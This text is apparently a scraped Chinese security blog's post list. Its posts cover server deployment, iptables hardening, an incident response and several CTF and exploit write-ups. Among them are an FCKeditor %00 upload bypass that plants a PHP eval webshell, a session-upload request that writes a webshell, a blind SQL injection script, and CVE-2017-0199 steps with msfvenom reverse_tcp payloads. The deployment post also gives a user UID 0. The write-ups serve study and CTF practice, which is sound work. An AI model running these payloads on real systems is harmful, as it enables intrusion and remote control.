安装及配置nginx&emsp;&emsp;nginx直接使用apt安装即可。安装完成后我们在/etc/nginx/conf.d/目录下为nginx与uwsgi通信建立配置文件。文件名可以任意，内容如下：1234567891011121314151617181920212223242526272829server { # nginx服务开启的端口 listen 80; # 如果有域名则写上域名，否则使用IP地址 server_name www.secsearch.top; # Nginx日志配置 access_log /var/log/nginx/access.log; charset utf-8; # Nginx编码 gzip_types text/plain application/x-javascript text/css text/javascript application/x-httpd-php application/json text/json image/jpeg image/gif image/png application/octet-stream; # 支持压缩的类型 error_page 404 /404.html; # 错误页面 error_page 500 502 503 504 /50x.html; # 错误页面 # 指定项目路径uwsgi location / { # uwsgi_params在nginx文件夹下 include /etc/nginx/uwsgi_params; # 设置连接uWSGI超时时间 uwsgi_connect_timeout 30; # nginx与uwsgi的通信方式，动态请求会通过sock传递给uwsgi处理 uwsgi_pass unix:/root/django/uwsgi/uwsgi.sock; } # 这里使用上面收集的静态文件夹目录 location /static/ { alias /root/django/static/; index index.html index.htm; }} 启动服务&emsp;&emsp;接下来我们启动uwsgi，进入刚才新建的uwsgi文件夹，通过配置文件启动uwsgi：1uwsgi --ini uwsgi.ini &emsp;&emsp;执行后会在该文件夹下生成uwsgi.log用来记录uwsgi日志，我们可以先查看一下该文件，以保证我们的uwsgi服务是正常的。 &emsp;&emsp;然后我们启动nginx：1service nginx start &emsp;&emsp;现在通过域名（如果你上面配置的是域名，否则使用IP）访问网站，看是否正常运行。如果你能成功运行那么恭喜你，你可以不用往下看了，如果你出现了一些错误，那么可以借鉴我的解决思路。再附上关闭uwsgi服务和nginx的命令：12killall -9 uwsgiservice nginx stop 部署中遇到的问题及解决方案&emsp;&emsp;这里我访问网站后发现是502错误，这也是我遇到的一个大坑，很多博客都没有解释和解决掉这个问题。 &emsp;&emsp;出现502后查看日志文件：cat /var/log/nginx/access.log，发现是权限问题，原来nginx默认是www-data用户运行，但该用户没有权限访问root下的目录文件，所以导致服务器出现错误。所以我们需要以root身份运行，但root实在是太敏感，所以上面专门添加的用户junay就起作用了。 &emsp;&emsp;首先我们修改junay的权限，通过：vim /etc/passwd，将juany修改成如下：1junay:x:0:0:,,,:/home/junay:/usr/bin/git-shell &emsp;&emsp;这里我们将junay的默认shell设成git-shell，防止该用户登陆bash，其次，我们再修改/etc/ssh/sshd_config，在该文件中添加如下两行，禁止junay使用ssh。12AllowUsers rootDenyUsers junay &emsp;&emsp;最后我们修改nginx的默认用户，改配置文件为/etc/nginx/nginx.conf，将它的user一行改为： &emsp;&emsp;修改完成后，我们重新启动nginx，使用：service nginx restart，现在我们就成功的完成了django的部署。如果你还是出现了问题，那么请仔细查看uwsgi和nginx的日志文件。","link":"/2018/01/django-nginx-uwsgi/"},{"title":"FCKeditor 上传漏洞-截断上传","text":"介绍&emsp;FCKeditor编辑器还是使用比较广泛的网站后台编辑器，在此次实战中应用了截断上传漏洞，不过有些不同的是，截断的不是文件名，而是上传路径。适用版本：&lt;=2.6.4。 涉及手段： %00截断、文件覆盖 实战&emsp;一开始，尝试在文件名后截断，但全都无果，Google后发现篇paper，使用之，成功upload。主要思路文件夹截断，并把文件夹名当作上传文件名，从而绕过对文件名的验证。 &emsp;Step 1：在本地编辑好PHP一句话，并且保存为txt格式。（不免杀） &emsp;Step 2：选择PHP上传，并选中编辑好的txt文件。 &emsp;Step 3：用burpsuite抓包，在文件夹路径下写好上传后的文件名，并在最后用%00截断，如下图： &emsp;Step 4：改好后放行，可以看到文件成功上传，然后访问返回的command.php。 &emsp;Step 5：在这执行系统命令，但可以会受到权限限制。 &emsp;Step 6：同样的方法可用于一句话上传，然后使用菜刀连接。 参考链接File-Upload-Vulnerability-in-FCKEditor.pdfFCKeditor各版本绕过","link":"/2017/11/fckeditor-upload/"},{"title":"got/plt表学习","text":"&emsp;&emsp;plt/got表在pwn中经常被提及与使用，这篇文章就简单讲讲plt/got表的作用及流程。 首先为什么需要使用这门技术？&emsp;&emsp;大家都知道操作系统通常使用动态链接的方法来提高程序运行的效率。在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载，如果有函数并没有被调用，那么它就不会在程序生命中被加载进来。这样的设计就能提高程序运行的流畅度，也减少了内存空间。 &emsp;&emsp;plt/got在其中就起到了重要作用，起到了映射作用。 GOT&emsp;&emsp;GOT（Global Offset Table）全局偏移表用于记录在 ELF 文件中所用到的共享库中符号的绝对(真实)地址。在程序刚开始运行时，GOT 表项是空的，当符号第一次被调用时会动态解析符号的绝对地址然后转去执行，并将被解析符号的绝对地址记录在 GOT 中，第二次调用同一符号时，由于 GOT 中已经记录了其绝对地址，直接转去执行即可（不用重新解析）。 PLT&emsp;&emsp;PLT（Procedure Linkage Table）过程链接表的作用是将位置无关的符号转移到绝对地址。当一个外部符号被调用时，PLT 去引用 GOT 中的其符号对应的绝对地址，然后转入并执行。 &emsp;&emsp;用一张图来描述就是： &emsp;&emsp;这里可以注意一下这里的表并不意味着表里的数据就是一个（地址、指令），还可能是一串代码（function），在后面会体现出来。### DEMO&emsp;&emsp;这里我们通过用gdb跟踪调试一个带puts的程序来讲解。这段程序在ida中的体现如下（只针对puts）：&emsp;&emsp;调用点： &emsp;&emsp;plt表指向： &emsp;&emsp;got表： &emsp;&emsp;为了先有个整体的思路，这里先放两张图，图中的地址并不是这个demo的地址，但流程一样。&emsp;&emsp;第一次调用时got表还没有该函数的真实地址，此时的流程是： &emsp;&emsp;第一次调用以后got表里已经有该函数的真实地址，以后的流程是： &emsp;&emsp;特别说明的是：1_dl_runtime_resolve：在函数被第一次执行时进行地址解析和重定位工作 &emsp;&emsp;打开gdb，我们在call _puts的前面下个断点，然后进行调试： &emsp;&emsp;这里有点疑惑的地方就是我的_dl_runtime_resolve没有被识别出来。&emsp;&emsp;因为疑惑，所以在后面我在可能它的地址0xf7fee000处下了断点，然后c执行。&emsp;&emsp;在它的内部果然返回了puts的真实地址： 第二次跟踪&emsp;&emsp;这次我们直接跟plt --&gt; got &emsp;&emsp;可以看到我们在got表中直接取到了puts的真实地址0xf7e6bca0，这个值也跟第一次得到的一样。 &emsp;&emsp;这时，我们在回过头看上面那两张流程图就比较能理解了。 参考链接 http://rickgray.me/2015/08/07/use-gdb-to-study-got-and-plt/ https://www.jianshu.com/p/0ac63c3744dd https://tinylab.gitbooks.io/cbook/zh/chapters/02-chapter4.html","link":"/2018/11/got-plt-study/"},{"title":"通过iptables配置加强服务器安全","text":"绪言&emsp;&emsp;VPS在公网上使用得越来越多，如何提高自己的服务器安全也变得重要起来，特别是脚本横飞的时代，如果不对服务器加以修饰，每天lastb的记录都能增加很多。而且对外提供越多的服务意味着暴露的缺陷就越多，所以掌握iptables的基本使用中解决很多问题。 主动模式1iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT &emsp;&emsp;首先对自己主动发送的请求进行响应的报文放行，这里尤其注意是对自己已发送的报文进行响应，如果是其他客户端发送过来的请求连接这里不做处理，使用默认的或后续的匹配策略处理。因为在iptables看来每个协议都有建立连接的概念，包括“udp”、“icmp”。state支持的状态有：NEW、ESTABLISHED、RELATED、INVALID、UNTRACKED。 NEW：就是双方进行通信时第一个到来的报文； ESTABLISHED：state把NEW以后到来的报文都定义为ESTABLISHED状态，包括UDP等，所以说state是有类似于tcp三次握手建立连接的概念； RELATED：在一个服务中，可能开启了两个进程，而且这两个进程都需要跟服务器进行通信，例如FTP有两个通信链路，命令链路和传输数据的链路，这两个链路就是存在关系的，所以他们属于RELATED状态； INVALID：表示一个包不能被识别； UNTRACKED：表示报文不能被追踪； 为SSH加固1iptables -A INPUT -p icmp --icmp-type 8 -m length --length 128 -m recent --set --name SSH --rsource -j ACCEPT &emsp;&emsp;length模块用于匹配报文长度，这里我们用ping报文的长度来充当芝麻开门的作用，recent模块功能很强，能将匹配到的报文信息记录下来，给后续规则做条件使用。它的几个参数为： —name： 给用来记录报文的列表起名称；（这里应该是两个-） —set： 表示将匹配到的报文记录下来； —rsource: 表示记录源IP地址； &emsp;&emsp;这条指令的意思是：将ping报文长度为128的源IP地址记录到叫SSH的列表中去。这里需要注意的是ping报文头部长度就有28字节，所以实际的填充报文为：128-28=100。所以在Linux下使用ping -s 100 ip；在Windows下使用ping -l 100 ip来敲开服务器大门。 &emsp;&emsp;相关的icmp报文的类型如下（因为ssh客户端是ping的请求方（发起方），所以这里要匹配类型为8的报文）： 类型代码 类型描述 0 响应应答（ECHO-REPLY） 3 不可到达 4 源抑制 5 重定向 8 响应请求（ECHO-REQUEST） 11 超时 12 参数失灵 13 时间戳请求 14 时间戳应答 15 信息请求（*已作废） 16 信息应答（*已作废） 17 地址掩码请求 18 地址掩码应答 1iptables -A INPUT -p tcp --dport 8888 -m state --state NEW -m recent --rcheck --seconds 20 --name SSH --rsource -j ACCEPT &emsp;&emsp;8888是ssh修改后的端口号，这里之所以匹配NEW状态是因为后面我们需要对INPUT使用白名单策略，而NEW之后的状态在前面已经放行，所以这里需要对NEW状态进行放行。这里再对recent的两个参数进行说明： —rcheck： 检查源IP是否在列表中，以第一个匹配开始计算时间 —seconds： 记录的源IP地址的有效时间 &emsp;&emsp;所以这一整句话是说对NEW（新建）状态下请求8888端口的源IP进行检查，看这个IP是否在名叫SSH的列表之中，有效时间是20秒，这里的有效时间是指上一条规则记录下源IP的时间离用户请求SSH服务器的时间间隔。所以用户必须在ping完的20秒内连接客户端，否则连接失败，重新ping。 PS： 如果是私有的git服务器的话，也同样适用这套规则，登陆或clone、push前都需要进行特殊的操作，这就能很好的保护数据和服务器的安全问题。不要以为这是弱智的问题，，这两天逛tools的时候就有人的git服务器被人攻破。。。 将INPUT策略改成白名单模式&emsp;&emsp;白名单是只接受自己信任的来源，而对非信任区来源采用拒绝策略；黑名单则只拒绝自己不信任的来源，接受信任或目的不明确的来源。所以采用白名单的策略系统的安全性较高，而黑名单难免会有疏忽。 &emsp;&emsp;要使用白名单，只需将INPUT的默认策略从ACCEPT改成DROP。可以使用iptables -P DROP,但如果一不小心清空了ACCEPT的规则，那么服务器将按照默认drop的策略拒绝所有的连接，导致服务器失联。所以我们使用另一种较为安全的策略：1iptables -A INPUT -j DROP &emsp;&emsp;我们在INPUT链的最后一条上加上DROP规则，这样即使我们不小心iptables -F INPUT清除掉INPUT规则也不用担心服务器失联。 &emsp;&emsp;值得一提的是，由于采用了DROP策略，所以ping只接收长度为100的报文，也就是说正常的ping是不会被服务器接收的，这就提供了保护主机的安全的方法，相当于把主机从公网中隐藏起来，只有知道口令的人才能找得到。 保存iptables配置&emsp;&emsp;笔者主机为：Ubuntu 16.04，首先安装：12apt install iptables-persistentapt install netfilter-persistent # ubuntu 14.04可以不用 &emsp;&emsp;保存：1netfilter-persistent save &emsp;&emsp;在/etc/rc.local中添加开机时自动执行恢复操作：1netfilter-persistent reload 后言&emsp;&emsp;这里只是简单的在INPUT中加固了ssh连接，但对其他类似web的服务没有讲解，但这并不是说iptables对这些服务没有办法，相反，iptables能很好的加强系统安全。比如有些服务不想暴露给外部直接访问，只允许本地处理。这时我们就能使用类似于这样的规则：1iptables -I INPUT ! -s 127.0.0.1 -j DROP &emsp;&emsp;通过配置iptables还可以在有限程度上防止CC攻击、DDOS等攻击，它可用的一些模块还有： string： 可以匹配链路中出现的特定字符； time： 对链路的时间规则； limit： 对IP的并发限制； 这在后续博文中可能有所涉及。","link":"/2017/12/iptables/"},{"title":"记黑塔的一次应急响应","text":"发现问题&emsp;&emsp;今天下午15时左右，跟往常一样登陆后台查看信息，在输入账号密码后居然发现提示账号密码不正确！第一次以为自己输入错误，但接连输入几次后发现都是错误，心里顿时毛骨悚然，mmp的，难道那么快就被hack掉了？？赶紧远程服务器！！ 处理过程&emsp;&emsp;在登陆服务器后第一件事就是history判断服务器是否被get shell，然而却发现并没有可疑的操作，当然也有可能被擦除掉，但我相信这个可能性比较低。由于不清楚危险等级，所以只能把web服务先关闭，换成正在升级的公告，这也是为了避免不必要的影响。 &emsp;&emsp;关闭服务器后，马上查看运行日志，第一顺序就是判断后台是否沦陷，使用正则提取POST/GET到后台地址的记录，发现条数并不是很多，而且查看今天操作的时间也跟自己操作的时间重合，昨天只有三条记录，看着这心里顿时松了口气，由此可见后台地址的重要性，这也是用户数据的最后一颗稻草。 &emsp;&emsp;然后查看一下日志的记录大小，没把我吓一跳，39W+的记录，我就是对黑塔项目再自信也不认为两三天内能产生那么多正常的访问记录。 &emsp;&emsp;接着为了分析日志方便，我把几十兆的日志文件从服务器上拉了下来，欣慰的是下载速度能达到2M左右，所以也没耽误什么时间。用UE打开后，随便一拉就发现了某用户（这里之所以说某是因为后面通过日志发现了他）在激活页面疯狂提交重置admin密码的验证码，好家伙，足足爆破了3个小时左右，接近10W条记录。 &emsp;&emsp;为了更清晰的还原他的操作，继续分析日志，此时重点就在爆破前和爆破后的日志记录了，先翻到爆破前，发现此用户尝试注册admin用户，但提示用户存在，注册失败！接着根据日志，他跑到了重置密码页面，一开始使用admin + 他的邮箱重置密码，但这肯定不行。这时，他灵光一闪【奸笑】，想到了他注册时给他发送邮件的邮箱，这也正是admin的邮箱！！然后，他再使用重置密码，但激活码发送到了admin的邮箱，这才出现了39W+的爆破记录，很明显，这将无疾而终。但他成功的把admin的账号给冻结了，导致一开始出现的admin用户无法登陆现象。 总结和修复方案&emsp;&emsp;可以看到，整件事的产生都是因为admin信息的泄漏，而admin及其邮箱都是本地开发时使用的调试信息，在上线前，作者对系统中用户可控的各个输入点都进行了严密的过滤，但却没能防止敏感信息泄漏。所以，在以后的开发中，一定要注意调试环境跟生产环境间敏感信息的保护，像拿到调试环境所泄漏的敏感信息从而攻克整个生产系统的案例并不少见，如默认用户、test用户等。 &emsp;&emsp;修复方案： 删除默认管理员账号，禁用诸如admin、root用户名作为管理员账号； 对提交页面做次数限制，防止恶意爆破，就算不能爆破成功也要减少系统开销；","link":"/2018/01/hackta-yingji/"},{"title":"JWT token破解绕过","text":"前言&emsp;&emsp;这是印度举办的CTF中遇到的一道JWT破解绕过题，觉得还是挺有价值的，mark一下。 JWT伪造&emsp;&emsp;这是一道b00t2root的一道web题，觉得很有意思，并且结合了加密的知识，所以记录一下。 &emsp;&emsp;首先了解下JWT： JSON Web Token（JWT）是一个非常轻巧的规范。这个规范允许我们使用JWT在用户和服务器之间传递安全可靠的信息。JWT常被用于前后端分离，可以和Restful API配合使用，常用于构建身份认证机制。 &emsp;&emsp;JWT的数据格式分为三个部分： headers , payloads，signature(签名)，它们使用.点号分割。拿道题后看了一下cookie，发现是如下格式： 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ImZhbHNlIn0.oe4qhTxvJB8nNAsFWJc7_m3UylVZzO3FwhkYuESAyUM &emsp;&emsp;进行base64解密后发现： &emsp;&emsp;所以，我们的目的就是把false改成true，而且要通过服务器的验证，这点很重要，并不是直接把false改成true就万事大吉了。因为服务器收到token后会对token的有效性进行验证。 &emsp;&emsp;验证方法：首先服务端会产生一个key，然后以这个key作为密钥，使用第一部分选择的加密方式（这里就是HS256），对第一部分和第二部分拼接的结果进行加密，然后把加密结果放到第三部分。 1服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。 &emsp;&emsp;因为加密算法我们已经知道了，如果我们只要再得到加密的key，我们就能伪造数据，并且通过服务器的检查。 &emsp;&emsp;这里我使用了这个工具进行破解：C语言版JWT破解工具，下载安装完毕后，直接进行破解，如图： &emsp;&emsp;所以，我的加密密钥就是：54l7y。然后我们去验证一下，这个网站可以提供验证服务：https://jwt.io/。当我们使用破解出来的key时，我们能完美还原出原始数据，这证明我们的key是正确的。 &emsp;&emsp;最后我们把false改成true，然后使用key进行加密，可以得到如下： &emsp;&emsp;然后我们拿着这个token刷新一下： &emsp;&emsp;可以看到flag已经出来了。 参考链接https://github.com/brendan-rius/c-jwt-crackerhttps://auth0.com/blog/brute-forcing-hs256-is-possible-the-importance-of-using-strong-keys-to-sign-jwts/https://jwt.io/http://www.cnblogs.com/dliv3/p/7450057.html","link":"/2018/03/jwt-bypass/"},{"title":"Kali安装pocscan","text":"介绍&emsp;简单记录在Kali下安装Pocscan，Pocscan是一款开源 Poc 调用框架,可轻松调用Pocsuite,Tangscan,Beebeeto,Knowsec老版本POC 按照官方规范编写的 Poc对目标域名进行扫描，并可以通过 Docker 一键部署。 Step 1：apt-get install docker Step 2: 更改更新源列表（/etc/apt/source.list），往里面增加docker更新源。解决：没有可用的软件包 docker.io，但是它被其它的软件包引用了。E: 软件包 docker.io 没有可安装候选 1deb http://http.debian.net/debian jessie-backports main step 3：apt-get install docker.io step 4：service docker start step 5: docker pull daocloud.io/aber/pocscan:latest step 6: cd / step 7: git clone https://github.com/erevus-cn/pocscan.git step 8: chmod -R 0777 pocscan step 9: docker run -d -v /pocscan:/www -p 8090:8000 -p 8088:8088 daocloud.io/aber/pocscan:latest step 10: 访问本地8090端口，后台和终端的帐号是root,密码是password. Step 11：安装google chrome，并把主目录下pocsuite中的pocscan.crx安装到chrome。","link":"/2017/11/kali-install-pocscan/"},{"title":"Windows 远程连接 kali","text":"这篇文章成功解决了windows下远程连接 kali 的一些问题，免去了网上一些教程中提到的卸载桌面再安装桌面的步骤。 本篇教程的系统环境为： windows 7 专业版 kali linux 2016-2 Step 1：安装xrdp 1# apt-get install xrdp Step 2：安装vnc4server 1# apt-get install vnc4server Step 3：编辑xrdp配置文件 1# nano /etc/xrdp/xrdp.ini 为了防止出现诸如以下错误，需对该配置文件进行修改。 将原来max_bpp=32改成max_bpp=16，以防止远程连接时闪退。 Step 4：开启xrdp服务 12# service xrdp start# service xrdp-sesman start Step 5：开启VNC服务 1# cnvserver 输入连接密码 Step 6：在windows下运行mstsc 因为远程服务器将颜色调成了32位，所以我们需要在本地上调整颜色深度。 这里选择Xvnc，然后输入用户、密码。 可以看到成功连接到kali。","link":"/2017/11/kali-remote/"},{"title":"Linux Xampp安装配置Xdebug","text":"介绍&emsp;Xdebug是一个开源的PHP程序调试工具，可以使用它来调试、跟踪及分析程序运行状态，XAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包，很多PHP初学者都会使用XAMPP+Xdebug的组合。下面介绍怎样在Linux xmapp下安装xdebug。 Step 1：安装Xdebug&emsp;前往xdebug官网下载相应的版本，如果不知道下载什么版本，可通过官网上自动判断程序。只需新建一个php文件，内容如下： 123&lt;?php phpinfo();?&gt; 在浏览器中访问并把整个网页的源代码复制下来，提交到如下链接中 点击判断。即可得到适合的版本。 Step 2：解压、安装文件解压文件：12# tar –xzvf xdebug-2.5.4.tgz# cd xdebug-2.5.4/ 安装前检索，执行phpize，这里由于每个人的路径不一，建议使用find命令查找执行。1# find / -name phpize 得到路径后执行，如：1# /opt/lampp/bin/phpize 执行时如遇如下错误需要安装autoconf解决。 1# apt-get install autoconf安装完成后，重新执行1# /opt/lampp/bin/phpize 可见成功运行。 安装12# ./configure –enable-xdebug –with-php-config=/opt/lampp/bin/php-config# make 按提示执行1# make test 接下来安装xdebug1#make install 成功安装. Step 3：配置php.ini&emsp;首先找到php.ini文件，如果不知道位置可通过find找到。在xampp下是/opt/lampp/etc/php.ini &emsp;然后将xdebug.so路径添加进配置文件，不知道路径同样使用find查找。Xampp下是在 /opt/xdebug-2.5.4/modules/xdebug.so。在文尾添加： zend_extension=” /opt/xdebug-2.5.4/modules/xdebug.so” 再将如下配置添加到末尾：12345678910111213141516171819202122232425262728293031;显示错误信息xdebug.default_enable = 1 ;函数调试 xdebug.auto_trace=on xdebug.trace_output_dir xdebug.trace_output_name ;Type: string, Default value: trace.%c ; (参数长度，参数值，参数=值)xdebug.collect_params = 1|3|4; 显示内存xdebug.show_mem_delta=1 显示返回值xdebug.collect_return=1 ; 追加日志xdebug.trace_options =1 xdebug.collect_params=1 xdebug.collect_vars = 1 ;开启性能分析 xdebug.profiler_enable=1 ;性能分析日志保存目录 xdebug.profiler_output_dir = /data/logs/xdebug/ ;性能分析日志文件名称 xdebug.profiler_output_name = cachegrind.out.log ;默认是如下格式,t时间,p进程id ;xdebug.profiler_output_name = cachegrind.out.%t.%p ;代码覆盖率 xdebug.coverage_enable = 1 ;以下是远程调试配置 xdebug.remote_host= 127.0.0.1 xdebug.remote_connect_back = 1 xdebug.remote_port = 9000 xdebug.remote_log=\"/data/logs/xdebug/xdebug.log\" step 4：重启xampp&emsp;此时在phpinfo页面上可以看到xdebug的信息","link":"/2017/11/linux-install-xdebug/"},{"title":"N1CTF easy_harder_php非预期解法","text":"前言&emsp;&emsp;上篇文章中复现了官方的预期解法，这里单独将非预期解法拿出来复现一遍并记录解题过程。非预期解法有三种： 1、session.upload开启导致session包含漏洞 2、xdebug 3、/tmp/临时文件竞争 &emsp;&emsp;本来以为pull下的docker有easy php的环境，但经过检查后却发现不满足条件，所以这篇文章主要起到备忘录的作用，以供以后遇到满足的条件时方便查阅。 1、session.upload开启导致包含漏洞&emsp;&emsp;session.upload_progress.enabled这个参数在php.ini 默认开启，需要手动置为Off，如果不是Off，就会在上传的过程中生成上传进度文件，它的存储路径可以在phpinfo获取到1/var/lib/php5/sess_{your_php_session_id} &emsp;&emsp;但是从官方拉下来的源码中，发现这个session.upload_progress.enabled参数已经被关闭，所以这个解法就没法复现了。 &emsp;&emsp;所以这里只进行记录这个解法的流程。 &emsp;&emsp;首先构造一个这样的报文(from @berTrAM)，不断的向服务端发送1234567891011121314151617181920212223242526272829303132333435POST / HTTP/1.1Host: 47.52.246.175:23333Proxy-Connection: keep-aliveContent-Length: 648Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: nullContent-Type: multipart/form-data; boundary=----WebKitFormBoundary2rwkUEtFdqhGMHqVUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=5uu8r952rejihbg033m5mckb17------WebKitFormBoundary2rwkUEtFdqhGMHqVContent-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;&lt;?=`echo &apos;&lt;?php eval($_REQUEST[bertram])?&gt;&apos;&gt;bertram.php`?&gt;------WebKitFormBoundary2rwkUEtFdqhGMHqVContent-Disposition: form-data; name=&quot;file2&quot;; filename=&quot;1.php&quot;Content-Type: text/php&lt;?php eval($_POST[1]);?&gt;------WebKitFormBoundary2rwkUEtFdqhGMHqVContent-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;2.asp&quot;Content-Type: application/octet-stream&lt; %eval request(&quot;a&quot;)%&gt;------WebKitFormBoundary2rwkUEtFdqhGMHqVContent-Disposition: form-data; name=&quot;submit&quot;Submit------WebKitFormBoundary2rwkUEtFdqhGMHqV-- &emsp;&emsp;服务器就会在/var/lib/php5/sess_5uu8r952rejihbg033m5mckb17中记录这个上传的文件。接着我们不断刷新生成包含恶意php代码的文件，然后通过LFI包含这个文件1action=../../../../../var/lib/php5/sess_5uu8r952rejihbg033m5mckb17 &emsp;&emsp;即可getshell 2、xdebug&emsp;&emsp;要使用Xdebugget shell，首先服务器要开启如下参数： &emsp;&emsp;但pull下来的docker中，这个参数都不被满足，所以又只能记录利用方式，等以后碰到了方便查阅。 &emsp;&emsp;这里参照rr师傅的博客，首先我们先确定是否可以利用xdebug。 &emsp;&emsp;当 X-Forwarded-For 的地址（这里就是：ricterz.me）的 9000 端口收到连接请求，就可以确定开启了 Xdebug，且开启了 xdebug.remote_connect_back。 &emsp;&emsp;再下面的操作就参照师傅的博客就行了，这里因为没有环境就不再照抄了。 3、/tmp/临时文件竞争&emsp;&emsp;要使用临时文件竞争，phpinfo的环境要有如下配置： &emsp;&emsp;但公开的docker还是不满足条件。。。 &emsp;&emsp;它大概的原理就是趁系统还没把临时文件删除之前将这个文件包含起来，从而getshell，通常系统的守护进行删除时隔很小，大概在2~3s，所以，我们要使用多线程上传，然后不断刷新包含文件。 参考链接&emsp;&emsp;黑塔搜索结果&emsp;&emsp;官方writeup&emsp;&emsp;国外大佬-条件竞争writeup&emsp;&emsp;Xdebug利用&emsp;&emsp;Bendawang","link":"/2018/03/n1ctf-easy-harder-php/"},{"title":"N1CTF 77777 writeup","text":"前言&emsp;&emsp;这是我及我所在的团队第一次参加正式的CTF比赛，所取得的成绩也还算满意，比赛过程中作者负责web方向，比赛中的成果就是两道77777。 77777&emsp;&emsp;题目描述： &emsp;&emsp;这道题最坑的就是一开始没有判断出是否注入成功的依据，后面经师兄指导才发现依据就是注入的数字是否已经改变，当然这道题的环境官方也说明每个队注入没有隔离开，造成即使注入成功也可能被别的队刷走，从而影响判断。 &emsp;&emsp;又因为它是sptintf(&quot;xxx%d%s&quot;)，所以注入应该在str的地方，也就是在hi中进行注入，payload：hi=000 where ord(substr(password, 1, 1))&gt;100，因为是在update users set中注入，所以这里不需要再使用union,select等方法了。完整的payload如下图： &emsp;&emsp;如果注入成功，则会返回你的flag字段，如： &emsp;&emsp;由于这个题的环境不稳定，不太适合脚本的判断，所以，就手工注入一遍了。 77777 2&emsp;&emsp;这道题跟上一道提供的描述是一样的，不同的是对hi进行了更严格的过滤，上一道的payload就无效了。 &emsp;&emsp;这道题过滤了and or || &amp; &amp;&amp;（为了不产生二义，这里用空格分隔），但是唯独没有过滤掉|。所以我们可以选择|进行位注入。然后在检测一下，没有被过滤的是：substr select from if，所以考虑用if替代where进行判断。 &emsp;&emsp;经过一轮苦逼的测试，终于搞出一个payload：hi=000 | IF (substr((select substr( pw from 1)),1,1)&gt;'z',1,0)，这里( pw中间一定要有空格，不然无法绕过。另一个要说的就是pw from 1，它会返回pw字段从1开始的所有值。如：12pw = &apos;flag{123456}&apos;pw from 1 ---&gt; flag{123456} &emsp;&emsp;payload： &emsp;&emsp;判断的依据是返回的数字的最后一位，如： &emsp;&emsp;如果是返回错误则是如下： 另一个tips就是数字的后一位一定要0，不然如果是1的话就无法判断了。1 |任何也是真。 &emsp;&emsp;再然后就是逐位的判断，有些数字会被过滤掉，这点上不知道是我的payload有问题还是本来就是这样。。。。 &emsp;&emsp;如上，逐位比较的时候使用+1的方法，如果直接用2,3,4,…的话有些数字会被过滤，还有就是有些字符也会被过滤，但无关flag字段。&emsp;&emsp;附上脚本：12345678910111213141516171819202122232425262728# -*- coding:utf-8 -*-import requestsurl = 'http://47.52.137.90:20000/'flag = ''for i in range(1, 50): lc = '' for a in range(i): lc += '+1' lc = lc[1:] sql = '000 | IF (substr((select substr( pw from 1)),{0},1)&gt;\\'{1}\\',1,0)' for ch in range(33, 128): sqli = sql.format(lc, chr(ch)) data = { 'flag': 123, 'hi': sqli } # print(data) html = requests.post(url, data=data) text = html.text # print(text) if '123000' in text: flag += chr(ch) print(flag) break else: pass","link":"/2018/03/n1ctf-writeup/"},{"title":"Office CVE-2017-0199复现","text":"介绍&emsp;本文介绍在Ubuntu 14.04服务器版本下复现office cve-2017-0199。 环境 ubuntu 14.04服务器版 目录 验证 取消交互 Get Shell 1、验证&emsp;Step 1：安装apache2服务 &emsp;Step 2：在网站根目录下创建1.rtf，内容如下：1234test789 &lt;script&gt; var objShell = new ActiveXObject(&quot;wscript.shell&quot;); objShell.Run(&quot;%SystemRoot%\\\\system32\\\\calc.exe&quot;); &lt;/script&gt; &emsp;Step 3：验证apache的配置文件mime.types里有rtf的content type项因为mime.types的位置可能因系统而不同，所以直接使用find命令查找位置 &emsp;查看该文件，可以看到 &emsp;Step 4：使用office 2013 pro 创建空白文档，然后点击“插入”  “对象”,在文件名上填写完整的网页地址，选择链接到文件 &emsp;点击“确定”，然后在文档中可以看到 test789。 &emsp;注：在此步中，很可能不成功，具体原因未知。具体现象：在链接到1.rtf时显示找到路径，不存在该文件。但去链接同目录下的index.html文件时可以成功，成因未知。 &emsp;Step 5：将mime.types中的application/rtf rtf 改成 application/hta rtf重启apache服务 &emsp;Step 6：双击对象 &emsp;可见成功利用CVE-2017-0199漏洞 2、取消交互&emsp;为了取消用户交互，也就是让用户去双击&emsp;Step 1：将文件另存为.rtf格式 。。。。。直接被卡巴检测到恶意文件. &emsp;Step 2：用文本编辑器打开刚才保存的rtf格式文件，找到object标签所在地方 &emsp;把{object\\objautlink\\rsltpict 改成 {object\\objautlink\\objupdate\\rsltpict &emsp;保存文件再打开，这样就不用用户交互了。 &emsp;此时在虚拟机中新建一个空白文档，这时，在点击链接到文件后已经会自动弹出计算器了虚拟机环境：win7，office 2010 pro ———-### 3、Get Shell&emsp;在kali中利用exploit&emsp;Github地址：https://github.com/bhdresh/CVE-2017-0199下载后，在情景1下实验12345671) Generate malicious RTF file # python cve-2017-0199_toolkit.py -M gen -w Invoice.rtf -u http://192.168.56.1/logo.doc -x 12) (Optional, if using MSF Payload) : Generate metasploit payload and start handler # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe &gt; /tmp/shell.exe # msfconsole -x \"use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.1; run\"3) Start toolkit in exploit mode to deliver local payload # python cve-2017-0199_toolkit.py -M exp -e http://192.168.56.1/shell.exe -l /tmp/shell.exe按以上命令依次运行 &emsp;可证实该exploit可行。&emsp;但生成的.rtf在执行时会被杀软报毒，需要解决。","link":"/2017/11/office-cve-2017-0199/"},{"title":"kali下安装mongodb遇到的问题及解决方案","text":"&emsp;&emsp;此文仅以记录Kali下安装mongodb遇到的缺少libssl.so.1.0.0问题的解决方案，如果你安装时出现如下报错信息，那么这篇文章会帮助你解决问题。1mongod: error while loading shared libssl.so.1.0.0: 